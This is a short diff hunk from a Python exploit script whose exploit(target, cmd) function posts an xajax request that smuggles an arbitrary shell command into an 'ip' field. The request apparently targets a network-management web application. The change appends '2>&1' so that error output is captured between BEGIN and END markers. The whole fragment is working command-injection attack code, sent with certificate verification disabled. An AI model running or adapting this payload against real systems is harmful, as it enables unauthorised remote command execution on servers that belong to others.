@@ -34,7 +34,7 @@ def exploit(target, cmd):
     payload = {
         'xajax':'window_submit',
         'xajaxr':'1574117726710',
-        'xajaxargs[]':['tooltips','ip=>;echo \"BEGIN\";{};echo \"END\"'.format(cmd),'ping']
+        'xajaxargs[]':['tooltips','ip=>;echo \"BEGIN\";{} 2>&1;echo \"END\"'.format(cmd),'ping']
     }
     try:
         req = requests.post(url = target, data = payload, verify = False)
